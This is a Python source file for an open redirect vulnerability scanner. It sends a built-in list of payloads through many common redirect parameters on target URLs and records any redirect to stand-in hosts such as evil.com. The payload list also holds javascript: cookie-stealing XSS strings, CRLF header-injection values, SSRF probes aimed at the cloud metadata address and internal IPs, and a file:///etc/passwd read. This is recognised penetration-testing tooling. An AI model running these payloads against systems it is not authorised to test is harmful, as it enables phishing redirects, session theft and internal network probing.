#!/usr/bin/env python3

# by ibrahimsql - openredirect-scanner
# Discover framework compatibility module

import argparse
import os
import sys
import time
import requests
import re
import random
import json
import csv
import threading
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import signal

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Global variables
CURRENT_DATE = datetime.now().strftime("%Y-%m-%d")
CURRENT_TIME = datetime.now().strftime("%H:%M:%S")
OUTPUT_DIR = f"openredirect-scan-{int(time.time())}"

# ANSI colors for terminal output
RED = '\033[1;31m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
CYAN = '\033[1;36m'
NC = '\033[0m'  # No Color

# Timing configuration
REQUEST_TIMEOUT = 10
DELAY_BETWEEN_REQUESTS = 0.1
MAX_RETRIES = 2

# Thread control
stop_scanning = False
results_lock = threading.Lock()
vulnerable_urls = []
total_tested = 0

# Redirect parameters
REDIRECT_PARAMS = [
    "redirect", "redirect_to", "redirecturi", "redirect_uri", "redirectUrl", "RedirectUrl",
    "return", "returnurl", "returnUri", "return_url", "returnURL", "ReturnURL",
    "return_to", "returnTo", "returnto", "url", "next", "nextUrl", "next_url",
    "link", "goto", "to", "out", "view", "login_url", "loginurl", "continue",
    "dest", "destination", "redir", "redirect_url", "ReturnUrl", "forward",
    "forward_url", "forwardurl", "location", "exit_url", "exiturl", "target",
    "navigate", "return_path", "returnpath", "retUrl", "returl", "next_url",
    "rurl", "r_url", "u", "uri", "relaystate", "relayState", "RelayState",
    "redirectback", "redirect_back", "redirectBack", "checkout_url", "checkouturl",
    "checkout", "ref", "reference", "path", "file", "site", "page", "src",
    "source", "callback", "callbackurl", "callback_url", "go", "go_to", "goto",
    "move", "nav", "jump", "jump_to", "rpath", "redirect_uri_path", "success_url",
    "successurl", "success", "login", "logto", "logon", "loginto", "openid_url",
    "openidurl", "idp", "idp_uri", "referer", "redirect_from", "successURL",
    "nextURL", "home", "homepage", "landingpage", "login_success", "return_after_login"
]

# Test payloads
PAYLOADS = [
    "https://evil.com",
    "http://evil.com",
    "https://malicious.example.com",
    "http://malicious.example.com",
    "/evil.com",
    "malicious.example.com",
    "//evil.com",
    "//malicious.example.com",
    "//evil.com",
    "//malicious.example.com",
    "\\\\evil.com",
    "\\\\malicious.example.com",
    "%2F%2Fevil.com",
    "%2F%2Fmalicious.example.com",
    "%5C%5Cevil.com",
    "%5C%5Cmalicious.example.com",
    "/%2F%2Fevil.com",
    "/%2F%2Fmalicious.example.com",
    "/%5C%5Cevil.com",
    "/%5C%5Cmalicious.example.com",
    "%252F%252Fevil.com",
    "%252F%252Fmalicious.example.com",
    "%255C%255Cevil.com",
    "%255C%255Cmalicious.example.com",
    "https:evil.com",
    "http:evil.com",
    "https://evil.com",
    "http://evil.com",
    "https:\\evil.com",
    "http:\\evil.com",
    "https:/evil.com",
    "http:/evil.com",
    "%0D%0Ahttp://evil.com",
    "%0D%0Ahttps://evil.com",
    "%09//evil.com",
    "/%09/evil.com",
    "/%5Cevil.com",
    "//%0D%0Aevil.com",
    "/%2F%2Fevil.com",
    "/%5C%5Cevil.com",
    "/evil.com",
    ".evil.com",
    "javascript:alert(document.domain)",
    "javascript:alert('XSS')",
    "javascript://evil.com",
    "javascript://%0aalert(document.cookie)",
    "javascript://%0Aalert(document.cookie)",
    "data:text/html,<script>window.location='https://evil.com'</script>",
    "%0d%0aLocation:https://evil.com",
    "%0d%0aSet-Cookie:sessionid=123",
    "%0D%0ALocation:%20https://evil.com",
    "%0D%0ASet-Cookie:%20admin=true",
    "https://evil.com@legitimate-site.com",
    "https://legitimate-site.com.evil.com",
    "https://legitimate-site.com%40evil.com",
    "https://legitimate-site.com%2F%2Fevil.com",
    "https://evil.com%00https://legitimate-site.com",
    "https://evil.com%2500https://legitimate-site.com",
    "https://evil.com#https://legitimate-site.com",
    "//evil.com",
    "////evil.com",
    "///@evil.com",
    "//evil.com/",
    "//evil.com/",
    "\\evil.com",
    "\/evil.com",
    "/.evil.com",
    "/..evil.com",
    "evil.com/",
    "evil.com//",
    "evil.com/.",
    "evil.com/..",
    "http://127.0.0.1",
    "https://127.0.0.1",
    "//127.0.0.1",
    "http://192.168.1.1",
    "https://192.168.1.1",
    "//192.168.1.1",
    "http://10.0.0.1",
    "https://10.0.0.1",
    "//10.0.0.1",
    "http://169.254.169.254",
    "https://169.254.169.254",
    "//169.254.169.254",
    "file:///etc/passwd",
    "file://evil.com/etc/passwd",
    "ftp://evil.com",
    "ftps://evil.com",
    "sftp://evil.com",
    "ldap://evil.com",
    "ldaps://evil.com",
    "gopher://evil.com",
    "dict://evil.com",
    "../evil.com",
    "../../evil.com",
    "../../../evil.com",
    "..%2Fevil.com",
    "..%252Fevil.com",
    "....//evil.com",
    "..../evil.com"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:132.0) Gecko/20100101 Firefox/132.0"
]

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    global stop_scanning
    print(f"\n{YELLOW}[!] Scanning interrupted by user. Saving results...{NC}")
    stop_scanning = True

def print_info(message):
    print(f"{BLUE}[*] {message}{NC}")

def print_warning(message):
    print(f"{YELLOW}[!] {message}{NC}")

def print_error(message):
    print(f"{RED}[!] {message}{NC}")

def print_success(message):
    print(f"{GREEN}[+] {message}{NC}")

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def create_session():
    """Create a configured requests session"""
    session = requests.Session()
    
    retry_strategy = Retry(
        total=MAX_RETRIES,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    session.headers.update({
        'User-Agent': get_random_user_agent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    })
    
    return session

def ensure_output_dir():
    """Ensure the output directory exists"""
    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR)

def load_wordlist(wordlist_path):
    """Load parameters from wordlist file"""
    params = []
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    params.append(line)
        print_success(f"Loaded {len(params)} parameters from wordlist")
        return params
    except Exception as e:
        print_error(f"Error loading wordlist: {e}")
        return []

def load_urls_from_file(file_path):
    """Load URLs from file"""
    urls = []
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if not line.startswith(('http://', 'https://')):
                        line = 'https://' + line
                    urls.append(line)
        print_success(f"Loaded {len(urls)} URLs from file")
        return urls
    except Exception as e:
        print_error(f"Error loading URLs from file: {e}")
        return []

def is_redirect_response(response):
    """Check if response is a redirect"""
    return response.status_code in [301, 302, 303, 307, 308]

def analyze_redirect(response, payload):
    """Analyze redirect response for vulnerabilities"""
    if not is_redirect_response(response):
        return False, "No redirect detected"
    
    location = response.headers.get('Location', '')
    if not location:
        return False, "Empty location header"
    
    payload_indicators = [
        'evil.com',
        'malicious.example.com',
        '127.0.0.1',
        '192.168.1.1',
        '10.0.0.1',
        '169.254.169.254',
        payload.replace('https://', '').replace('http://', '').replace('//', '').replace('\\\\', '')
    ]
    
    location_lower = location.lower()
    for indicator in payload_indicators:
        if indicator.lower() in location_lower:
            return True, f"Vulnerable - redirects to: {location}"
    
    if 'javascript:' in location_lower:
        return True, f"JavaScript execution detected: {location}"
    
    if location.startswith('data:'):
        return True, f"Data URI redirect detected: {location[:100]}..."
    
    return False, f"Safe redirect to: {location}"

def test_url_with_payload(session, base_url, param, payload):
    """Test a single URL with a specific payload"""
    global total_tested
    
    if stop_scanning:
        return None
    
    try:
        parsed = urlparse(base_url)
        query_params = parse_qs(parsed.query)
        query_params[param] = [payload]
        
        new_query = urlencode(query_params, doseq=True)
        test_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))
        
        response = session.get(
            test_url,
            allow_redirects=False,
            timeout=REQUEST_TIMEOUT,
            verify=False
        )
        
        with results_lock:
            total_tested += 1
        
        is_vulnerable, details = analyze_redirect(response, payload)
        
        if is_vulnerable:
            result = {
                'url': test_url,
                'base_url': base_url,
                'parameter': param,
                'payload': payload,
                'status_code': response.status_code,
                'location': response.headers.get('Location', ''),
                'details': details,
                'timestamp': datetime.now().isoformat()
            }
            
            with results_lock:
                vulnerable_urls.append(result)
            
            print_success(f"VULNERABLE: {base_url} - Parameter: {param} - {details}")
            return result
        
        time.sleep(DELAY_BETWEEN_REQUESTS)
        
    except requests.exceptions.Timeout:
        print_warning(f"Timeout testing {base_url} with parameter {param}")
    except requests.exceptions.RequestException as e:
        print_error(f"Request failed for {base_url}: {str(e)}")
    except Exception as e:
        print_error(f"Unexpected error testing {base_url}: {str(e)}")
    
    return None

def scan_url(session, base_url, parameters, payloads, max_workers=10):
    """Scan a single URL with all parameters and payloads"""
    print_info(f"Scanning URL: {base_url}")
    print_info(f"Testing {len(parameters)} parameters with {len(payloads)} payloads")
    
    results = []
    total_tests = len(parameters) * len(payloads)
    completed_tests = 0
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_test = {}
        for param in parameters:
            for payload in payloads:
                if stop_scanning:
                    break
                future = executor.submit(test_url_with_payload, session, base_url, param, payload)
                future_to_test[future] = (param, payload)
        
        for future in as_completed(future_to_test):
            if stop_scanning:
                break
            
            completed_tests += 1
            param, payload = future_to_test[future]
            
            try:
                result = future.result()
                if result:
                    results.append(result)
            except Exception as e:
                print_error(f"Error processing test for {param} with {payload}: {e}")
            
            if completed_tests % 50 == 0 or completed_tests == total_tests:
                progress = (completed_tests / total_tests) * 100
                print_info(f"Progress: {completed_tests}/{total_tests} tests ({progress:.1f}%)")
    
    return results

def save_results(results, output_format='all'):
    """Save results in various formats"""
    ensure_output_dir()
    
    if not results:
        print_warning("No vulnerabilities found to save")
        return
    
    base_filename = os.path.join(OUTPUT_DIR, f"openredirect_results_{CURRENT_DATE}_{int(time.time())}")
    
    if output_format in ['txt', 'all']:
        txt_file = f"{base_filename}.txt"
        try:
            with open(txt_file, 'w', encoding='utf-8') as f:
                f.write(f"Open Redirect Vulnerability Scan Results\n")
                f.write(f"Scan Date: {CURRENT_DATE} {CURRENT_TIME}\n")
                f.write(f"Total Vulnerabilities Found: {len(results)}\n")
                f.write("="*80 + "\n\n")
                
                for i, result in enumerate(results, 1):
                    f.write(f"Vulnerability #{i}\n")
                    f.write(f"URL: {result['url']}\n")
                    f.write(f"Base URL: {result['base_url']}\n")
                    f.write(f"Parameter: {result['parameter']}\n")
                    f.write(f"Payload: {result['payload']}\n")
                    f.write(f"Status Code: {result['status_code']}\n")
                    f.write(f"Redirect Location: {result['location']}\n")
                    f.write(f"Details: {result['details']}\n")
                    f.write(f"Timestamp: {result['timestamp']}\n")
                    f.write("-"*50 + "\n\n")
            
            print_success(f"Results saved to: {txt_file}")
        except Exception as e:
            print_error(f"Error saving TXT results: {e}")
    
    if output_format in ['json', 'all']:
        json_file = f"{base_filename}.json"
        try:
            with open(json_file, 'w', encoding='utf-8') as f:
                json.dump({
                    'scan_info': {
                        'date': CURRENT_DATE,
                        'time': CURRENT_TIME,
                        'total_vulnerabilities': len(results)
                    },
                    'vulnerabilities': results
                }, f, indent=2, ensure_ascii=False)
            
            print_success(f"Results saved to: {json_file}")
        except Exception as e:
            print_error(f"Error saving JSON results: {e}")
    
    if output_format in ['csv', 'all']:
        csv_file = f"{base_filename}.csv"
        try:
            with open(csv_file, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(['URL', 'Base URL', 'Parameter', 'Payload', 'Status Code', 'Location', 'Details', 'Timestamp'])
                
                for result in results:
                    writer.writerow([
                        result['url'],
                        result['base_url'],
                        result['parameter'],
                        result['payload'],
                        result['status_code'],
                        result['location'],
                        result['details'],
                        result['timestamp']
                    ])
            
            print_success(f"Results saved to: {csv_file}")
        except Exception as e:
            print_error(f"Error saving CSV results: {e}")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description="Simple Open Redirect Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 openredirect_scanner.py -u https://example.com
  python3 openredirect_scanner.py -d example.com
  python3 openredirect_scanner.py -u https://example.com -w params.txt
  python3 openredirect_scanner.py -f urls.txt -o json
        """
    )
    
    parser.add_argument('-u', '--url', help='Target URL to test')
    parser.add_argument('-d', '--domain', help='Target domain to test')
    parser.add_argument('-f', '--file', help='File containing URLs to test')
    parser.add_argument('-w', '--wordlist', help='Custom parameter wordlist')
    parser.add_argument('-o', '--output', choices=['txt', 'json', 'csv', 'all'], default='all', help='Output format (default: all)')
    
    args = parser.parse_args()
    
    # Set up signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Collect targets
    targets = []
    if args.url:
        targets.append(args.url)
    elif args.domain:
        targets.append(f"https://{args.domain}")
    elif args.file:
        targets = load_urls_from_file(args.file)
    else:
        print_error("No target specified. Use -u, -d, or -f option.")
        sys.exit(1)
    
    if not targets:
        print_error("No valid targets found.")
        sys.exit(1)
    
    # Collect parameters
    parameters = list(REDIRECT_PARAMS)
    if args.wordlist:
        custom_params = load_wordlist(args.wordlist)
        parameters.extend(custom_params)
    
    # Remove duplicates
    parameters = list(dict.fromkeys(parameters))
    
    # Use built-in payloads
    payloads = list(PAYLOADS)
    
    print_info(f"Starting scan with {len(targets)} targets, {len(parameters)} parameters, {len(payloads)} payloads")
    
    # Perform scan
    start_time = time.time()
    session = create_session()
    all_results = []
    
    for i, target in enumerate(targets, 1):
        if stop_scanning:
            break
        
        print_info(f"[{i}/{len(targets)}] Scanning: {target}")
        results = scan_url(session, target, parameters, payloads, max_workers=10)
        all_results.extend(results)
    
    # Save and report results
    duration = time.time() - start_time
    print_info(f"Scan completed in {duration:.2f} seconds")
    print_info(f"Total tests performed: {total_tested:,}")
    print_info(f"Found {len(all_results)} vulnerabilities")
    
    if all_results:
        save_results(all_results, args.output)
        print_success(f"Found {len(all_results)} open redirect vulnerabilities")
    else:
        print_warning("No open redirect vulnerabilities found")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Scan interrupted by user{NC}")
        sys.exit(1)
    except Exception as e:
        print_error(f"Unexpected error: {e}")
        sys.exit(1)